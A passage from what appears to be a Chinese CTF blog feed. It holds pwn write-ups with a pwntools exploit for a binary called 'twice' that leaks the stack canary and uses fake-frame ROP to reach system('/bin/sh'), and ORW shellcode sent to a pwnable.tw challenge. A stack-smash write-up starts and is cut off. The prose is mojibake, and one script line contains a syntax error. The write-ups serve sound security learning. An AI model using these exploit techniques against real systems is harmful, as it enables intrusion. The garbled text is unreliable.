srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200713201139059"></p><p>â€‹        ç¨‹åºçš„ä¸»è¦åŠŸèƒ½æ˜¯å…è®¸è¿›è¡Œä¸¤æ¬¡è¯»å…¥ï¼Œç¬¬ä¸€æ¬¡è¯»å…¥89å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡112å­—èŠ‚ï¼Œä½†æ˜¯bufçš„é•¿åº¦æ˜¯88ï¼Œå› æ­¤ä¼šæº¢å‡ºä¸€ä¸ªå­—èŠ‚ã€‚</p><p><img src="https://s1.ax1x.com/2020/07/13/UYIDdP.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYIDdP.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200713205401610"></p><p>â€‹        åˆ©ç”¨è¿™ä¸ªæº¢å‡ºï¼Œå†åŠ ä¸Šreadè¯»å…¥æ•°æ®ä¸åŠ ä»¥è¡¥â€œ\x00â€çš„ç‰¹æ€§ï¼Œåœ¨readçš„ä¸‹ä¸€æ­¥è¿›è¡Œputsæ—¶ï¼Œç¨‹åºä¼šè¾“å‡ºåˆ°ä¸‹ä¸€ä¸ªâ€\x00â€ä¸ºæ­¢ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºæ—§çš„rbpåœ°å€ä»¥åŠcanaryçš„å€¼ã€‚</p><p>â€‹        ä¸è¿‡ç¨‹åºå¼€å¯äº†NXä¿æŠ¤ï¼Œæ ˆä¸Šä»£ç ä¸å¯æ‰§è¡Œï¼Œä¸èƒ½ç›´æ¥å†™shellcodeã€‚è¿™é‡Œéœ€è¦ç”¨åˆ°æ–°çŸ¥è¯†ï¼Œæ ˆè½¬ç§»æŠ€æœ¯ï¼ˆ<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#_5">frame faking</a>ï¼‰ï¼Œåˆ¶ä½œä¸€ä¸ªå‡çš„æ ˆå¸§è¿›è¡Œropã€‚å› ä¸ºç¨‹åºä¸­æ²¡æœ‰systemå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨ropæ³„éœ²å‡ºlibcåŸºå€ï¼Œå†è¿›è¡Œropè°ƒç”¨system(â€œ/bin/shâ€)</p><p>â€‹        frame fakingçš„å¤§è‡´payloadæ ¼å¼ä¸ºï¼š</p><p>â€‹        |xxxx xxxx|rop chain|padding|fake ebp|leave addr|</p><p>â€‹        å°†è¿”å›åœ°å€è¦†ç›–ä¸ºleaveæ±‡ç¼–ä»£ç çš„åœ°å€ï¼Œè¿™æ ·readå‡½æ•°ç»“æŸåå…ˆè¿›è¡Œæœ¬èº«å‡½æ•°çš„leaveæ“ä½œï¼Œå†è·³è½¬åˆ°æŒ‡å®šåœ°å€ï¼ˆå³leaveåœ°å€ï¼‰åˆè¿›è¡Œä¸€æ¬¡leaveæ“ä½œï¼Œä½¿å¾—rspå’ŒrbpæŒ‡å‘rop chainçš„é€‚å½“ä½ç½®ï¼Œå¾—ä»¥æ‰§è¡Œæˆ‘ä»¬è®¾è®¡çš„fake stack frameã€‚</p><p>â€‹        å°†rop chainç»†åŒ–å¯ä»¥å¾—åˆ°å¦‚ä¸‹payloadï¼š</p><p>â€‹        |xxxx xxxx|arg1|arg2|â€¦|fuction addr|ret addr|padding|fake ebp|leave addr|</p><p>â€‹        ä¸ºäº†å¤šæ¬¡è¿›è¡Œleakï¼Œéœ€è¦æŠŠä¸Šè¿°ret addrå³å‡æ ˆå¸§çš„è¿”å›åœ°å€ï¼Œå†è®¾ç½®ä¸ºæ¼æ´æ‰€åœ¨å‡½æ•°ï¼Œå³å¯é‡å¤è°ƒç”¨ã€‚</p><p>â€‹        æ­¤å¤„éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrop chainä¸­å¯èƒ½éœ€è¦è¿›è¡Œå¼¹æ ˆæ“ä½œï¼Œéœ€è¦åˆ©ç”¨ROPgardgeæŸ¥æ‰¾ç›¸åº”çš„åœ°å€ã€‚</p><p>â€‹        <a href="https://blog.csdn.net/baidu_36110484/article/details/107037767">payloadå‚è€ƒ</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">  </span><br><span class="line">p = process(<span class="string">&#x27;./twice&#x27;</span>)</span><br><span class="line">puts_plt_addr = <span class="number">0x4005C0</span></span><br><span class="line">read_got_addr = <span class="number">0x601038</span></span><br><span class="line">pop_rdi = <span class="number">0x400923</span></span><br><span class="line">leave = <span class="number">0x400879</span></span><br><span class="line">main_addr = <span class="number">0x40087B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">88</span>+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">89</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">112</span></span><br><span class="line">success(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(pop_rdi)+p64(read_got_addr)+p64(puts_plt_addr)+p64(main_addr)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">6</span>+p64(canary)+p64(rbp)+p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-0xEE590s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">88</span>+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">89</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">rbp2 = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">112</span></span><br><span class="line">success(<span class="built_in">hex</span>(rbp2))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc_addr+<span class="number">0x1881AC</span>)+p64(libc_addr+<span class="number">0x48880</span>)+p64(main_addr)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">6</span>+p64(canary)+p64(rbp2)+p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seccomp Sandbox (ORW)</title>
      <link href="2020/07/07/sandbox/"/>
      <url>2020/07/07/sandbox/</url>
      
        <content type="html"><![CDATA[<p>â€‹        freebufå…¬å¼€è¯¾pwnç¬¬äº”è¯¾æ€»ç»“ã€‚<span id="more"></span></p><h2 id="0x00-æ²™ç®±"><a href="#0x00-æ²™ç®±" class="headerlink" title="0x00 . æ²™ç®±"></a>0x00 . æ²™ç®±</h2><p>â€‹        æ²™ç®±æ˜¯ä¸€ä¸ªè™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼Œæ²™ç®±æä¾›çš„ç¯å¢ƒç›¸å¯¹äºæ¯ä¸€ä¸ªè¿è¡Œçš„ç¨‹åºéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œè€Œä¸”ä¸ä¼šå¯¹ç°æœ‰çš„ç³»ç»Ÿäº§ç”Ÿå½±å“ï¼Œå³æ²™ç®±æä¾›ä¸€ä¸ªé™åˆ¶è¯¥åº”ç”¨ç¨‹åºå¯¹ç³»ç»Ÿèµ„æºçš„è®¿é—®æƒé™ã€‚å¦‚æœç¨‹åºè°ƒç”¨äº†æ²™ç®±å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´åé¢æ‰§è¡Œçš„ä»£ç éƒ½ä¼šåœ¨è¿™ä¸ªæ²™ç®±ä¸­è¿›è¡Œã€‚è€Œæ²™ç®±ä¼šé™åˆ¶è®¸å¤š<strong>åº“å‡½æ•°</strong>å¯¼è‡´å…¶æ— æ³•ä½¿ç”¨ã€‚æ‰€ä»¥å¦‚æœè¦getshellï¼Œè¦ä¹ˆä»…åˆ©ç”¨å½“å‰æ²™ç®±å…è®¸çš„ç¨‹åºè¿›è¡Œgetshellï¼Œè¦ä¹ˆè¿›è¡Œ<strong>æ²™ç®±é€ƒé€¸</strong>(ä¸€èˆ¬æŒ‡çš„æ˜¯pythonæ²™ç®±é€ƒé€¸)ã€‚å…·ä½“æ–¹å¼éœ€è¦ç»“åˆå®é™…çš„ç¯å¢ƒå’Œæƒ…å†µã€‚</p><h2 id="0x01-ORW"><a href="#0x01-ORW" class="headerlink" title="0x01 . ORW"></a>0x01 . ORW</h2><p>â€‹        orwæŒ‡çš„æ˜¯ä¸‰ä¸ªæœ€åŸºæœ¬çš„åº“å‡½æ•°ï¼Œopenï¼Œreadï¼Œwriteã€‚å¾ˆå¤šæ—¶å€™é¢˜ç›®ä¼šè¦æ±‚æˆ‘ä»¬ä»…ç”¨è¿™ä¸‰ä¸ªå‡½æ•°å®ç°getshellã€‚å¤§è‡´ç¨‹åºæµç¨‹ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/home/test/flag&quot;</span>);<span class="comment">//ç”¨openå‡½æ•°æ‰“å¼€flagæ–‡ä»¶å¹¶è·å–ç´¢å¼•</span></span><br><span class="line">read(fd,buf,<span class="number">0x100</span>);   <span class="comment">//å°†æ–‡ä»¶ä¸­çš„æ–‡æœ¬é€šè¿‡readå‡½æ•°è¾“å…¥åˆ°bufä¸­</span></span><br><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x100</span>);   <span class="comment">//ç”¨writeå‡½æ•°è¾“å‡ºbuf</span></span><br></pre></td></tr></table></figure><h2 id="0x02-orw-From-pwnable-tw"><a href="#0x02-orw-From-pwnable-tw" class="headerlink" title="0x02 . orw From pwnable.tw"></a>0x02 . orw From pwnable.tw</h2><p>â€‹        åœ¨pwnable.twä¸Šæ‰¾äº†ä¸€ä¸ªæ²™ç®±ä¾‹é¢˜ã€‚</p><h3 id="1-Analysis"><a href="#1-Analysis" class="headerlink" title="1.Analysis"></a>1.Analysis</h3><p>â€‹        ä¾‹è¡Œå…¬äº‹1ï¼š</p><p><img src="https://s1.ax1x.com/2020/07/13/UYTSns.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYTSns.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703163831579"></p><p>â€‹        ä¾‹è¡Œå…¬äº‹2ï¼š</p><p><img src="https://s1.ax1x.com/2020/07/13/UYT97q.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYT97q.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703163855847"></p><p>â€‹        ä¾‹è¡Œå…¬äº‹3ï¼š</p><p><img src="https://s1.ax1x.com/2020/07/13/UYovcQ.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYovcQ.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703163932658"></p><p>â€‹        è¿è¡Œä¹‹åæ˜¯segment faultã€‚</p><img src="https://s1.ax1x.com/2020/07/13/UYoxXj.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYoxXj.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703150532100" style="zoom:90%;" /><p>â€‹        åœ¨ida32ä¸Šå¯ä»¥çœ‹åˆ°mainå‡½æ•°ååˆ†ç®€çŸ­ï¼Œè€Œä¸”å‘ç°äº†å¤§å¤§çš„orw_seccomp()ï¼Œå¯ä»¥ç¡®å®šç¨‹åºå­˜åœ¨æ²™ç®±æ²¡è·‘äº†ã€‚</p><p>â€‹        è€Œæ²™ç®±å‡½æ•°åé¢çš„ç¨‹åºï¼Œå¤§æ„å°±æ˜¯è¾“å…¥shellcodeå¹¶ç”¨å‡½æ•°æŒ‡é’ˆæ‰§è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨æ²™ç®±ï¼Œæ‰€ä»¥å½“ç„¶ä¸èƒ½ç›´æ¥æ‰§è¡Œsystem(â€œ/bin/shâ€)ã€‚å…ˆç”¨<strong>seccomp-tools</strong>æ¥çœ‹çœ‹ç¨‹åºæ²™ç®±çš„é™åˆ¶ã€‚</p><img src="https://s1.ax1x.com/2020/07/13/UYTpBn.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYTpBn.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:70%;" /><p>â€‹        ç¨‹åºä¸­orwçš„ä¸‰ä¸ªå‡½æ•°éƒ½æ˜¯å¯ä»¥è°ƒç”¨çš„ã€‚å› æ­¤éœ€è¦é€šè¿‡è¿™ä¸‰ä¸ªå‡½æ•°å†™shellcodeã€‚</p><h3 id="2-Shellcode"><a href="#2-Shellcode" class="headerlink" title="2.Shellcode"></a>2.Shellcode</h3><p>â€‹        æˆ‘ä»¬å·²ç»çŸ¥é“äº†åªè¿ç”¨orwä¸‰ä¸ªå‡½æ•°å¦‚ä½•è·å–flagï¼Œç°åœ¨åªéœ€è¦æŠŠæ•´ä¸ªæµç¨‹å†™æˆæ±‡ç¼–çš„shellcodeå³å¯ã€‚</p><p>â€‹        é™¤æ­¤ä¹‹å¤–è¿˜éœ€è¦æŸ¥ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨å‡½æ•°éœ€è¦ç”¨åˆ°é‚£äº›å¯„å­˜å™¨ï¼ŒåŠå…¶åˆ†åˆ«æœ‰å“ªäº›ä½œç”¨ï¼š</p><img src="https://s1.ax1x.com/2020/07/13/UYTPA0.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYTPA0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><h3 id="a-fd-open-â€œ-home-orw-flagâ€"><a href="#a-fd-open-â€œ-home-orw-flagâ€" class="headerlink" title="a . fd = open(â€œ/home/orw/flagâ€)"></a>a . fd = open(â€œ/home/orw/flagâ€)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> eax,eax;<span class="keyword">xor</span> ebx,ebx;<span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">xor</span> ecx,ecx;<span class="keyword">xor</span> edx,edx;</span><br><span class="line">mov eax,<span class="number">0x5</span>;<span class="comment">//opençš„ç³»ç»Ÿè°ƒç”¨ç ä¸º0x5</span></span><br><span class="line">push <span class="number">0x00006761</span>;<span class="comment">//flagè·¯å¾„ï¼Œéœ€è¦è¡¥0</span></span><br><span class="line">push <span class="number">0x6c662f77</span>;<span class="comment">//é€†åº</span></span><br><span class="line">push <span class="number">0x726f2f65</span>;<span class="comment">//å‹æ ˆæš‚å­˜</span></span><br><span class="line">push <span class="number">0x6d6f682f</span>;</span><br><span class="line">mov ebx,esp;<span class="comment">//è·¯å¾„ä¿å­˜è‡³ebx</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure><h3 id="b-read-fd-buf-0x30"><a href="#b-read-fd-buf-0x30" class="headerlink" title="b . read(fd,buf,0x30);"></a>b . read(fd,buf,0x30);</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax;<span class="comment">//ä¸Šä¸€å‡½æ•°åï¼Œeaxå·²è·å¾—fd</span></span><br><span class="line">mov ecx,esp;<span class="comment">//å°†è·¯å¾„çš„flagæ–‡ä»¶readåˆ°æ ˆä¸Š</span></span><br><span class="line">mov edx,<span class="number">0x30</span>;<span class="comment">//è¯»å–å­—èŠ‚æ•°ä¸º0x30</span></span><br><span class="line">mov eax,<span class="number">0x03</span>;<span class="comment">//readçš„ç³»ç»Ÿè°ƒç”¨ç ä¸º0x3</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure><h3 id="c-write-1-buf-0x30"><a href="#c-write-1-buf-0x30" class="headerlink" title="c.write(1,buf,0x30)"></a>c.write(1,buf,0x30)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x4</span>;<span class="comment">//writeçš„ç³»ç»Ÿè°ƒç”¨ç ä¸º0x4</span></span><br><span class="line">mov ebx,<span class="number">0x1</span>;<span class="comment">//fd = stdout</span></span><br><span class="line">mov ecx,ecx;<span class="comment">//è¦è¾“å‡ºçš„flagåœ¨æ ˆä¸Šï¼Œä½†æ˜¯ecxå·²ç»æŒ‡å‘espäº†ï¼Œå› æ­¤æœ¬æ­¥å¯ä»¥ä¸å†™</span></span><br><span class="line">mov edx,<span class="number">0x30</span>;<span class="comment">//è¾“å‡ºå­—èŠ‚æ•°ä¸º0x30</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure><h3 id="3-Exploit"><a href="#3-Exploit" class="headerlink" title="3.Exploit"></a>3.Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">_<span class="built_in">open</span> = <span class="string">&quot;xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;&quot;</span></span><br><span class="line">_read = <span class="string">&quot;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;&quot;</span></span><br><span class="line">_write = <span class="string">&quot;mov ebx,0x1;mov ecx,esp;mov edx,0x30;mov eax,0x4;int 0x80;&quot;</span></span><br><span class="line">payload = _<span class="built_in">open</span>+_read+_write</span><br><span class="line">payload = asm(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv(<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018ç½‘é¼pwn (guesså¤ç°)</title>
      <link href="2020/04/13/guess/"/>
      <url>2020/04/13/guess/</url>
      
        <content type="html"><![CDATA[<p>â€‹        2018ç½‘é¼pwné¢˜å¤ç°ä¸å­¦ä¹ ã€‚<span id="more"></span></p><p>â€‹        å› ä¸ºç½‘é¼ã€é“ä¸‰ã€å›½èµ›å·®ä¸å¤šäº†ï¼Œè€Œä¸”åˆ˜è€æ¿ä¹Ÿç»™äº†å»ºè®®ï¼Œå°±å†³å®šæ¥å¤ç°ä¸€ä¸‹2018ç½‘é¼çš„pwné¢˜ã€‚æ¯•ç«Ÿèµ›é¢˜æ¯”ä¸€èˆ¬çš„æ—§é¢˜ç›®å«é‡‘é‡æ›´å¤šï¼Œèƒ½å­¦åˆ°å¾ˆå¤šä¸œè¥¿ã€‚</p><p>â€‹        å†™é¢˜è§£ä¹‹å‰å…ˆè´´ä¸€äº›é“ºå«çŸ¥è¯†ï¼Œéƒ½æ˜¯è¿™ä¸ªé¢˜ç›®ä¼šç”¨åˆ°çš„ï¼Œä¹Ÿæ˜¯æ–°å­¦åˆ°çš„ã€‚</p><h2 id="0x00-Stack-Smash"><a href="#0x00-Stack-Smash" class="headerlink" title="0x00 . Stack Smash"></a>0x00 . Stack Smash</h2><p>â€‹        è¿™ä¸ªæŠ€æœ¯ç®—æ˜¯æ ˆæº¢å‡ºæŠ€æœ¯çš„ä¸€ç§ï¼Œä¹Ÿæ”¶å½•åœ¨CTF-Wikiä¸­ã€‚</p><p>â€‹        å¯¹äºå¼€å¯äº†canaryä¿æŠ¤çš„ç¨‹åºï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è¿›è¡Œæ ˆæº¢å‡ºï¼Œå› ä¸ºä¼šç ´åcanaryçš„å€¼ã€‚</p><img src="https://s1.ax1x.com/2020/07/14/UNPENT.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPENT.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /><p>â€‹        å¦‚æœå‡½æ•°è¿”å›æ—¶æ£€æŸ¥åˆ°canaryè¢«ç ´åäº†ï¼Œå°±ä¼šè·³è½¬åˆ°__stack_chk_fail()å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚</p><p>â€‹        çœ‹ä¸€ä¸‹åº“æ–‡ä»¶ä¸­çš„__stack_chk_fail()åŠå…¶å¼•ç”¨å‡½æ•°ï¼š</p><p><img src="https://s1.ax1x.com/2020/07/14/UNPFH0.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPFH0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><img src="https://s1.ax1x.com/2020/07/14/UNPAEV.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPAEV.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412191742905" style="zoom:67%;" /><p>â€‹        å†çœ‹ä¸€ä¸‹æºç (ç‰ˆæœ¬ä¸ºglibc-2.23)ï¼š</p><img src="https://s1.ax1x.com/2020/07/14/UNPQD1.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPQD1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412195528076" style="zoom:67%;" /><img src="https://s1.ax1x.com/2020/07/14/UNPMuR.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNPMuR.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412195511596" style="zoom:67%;" /><p>â€‹        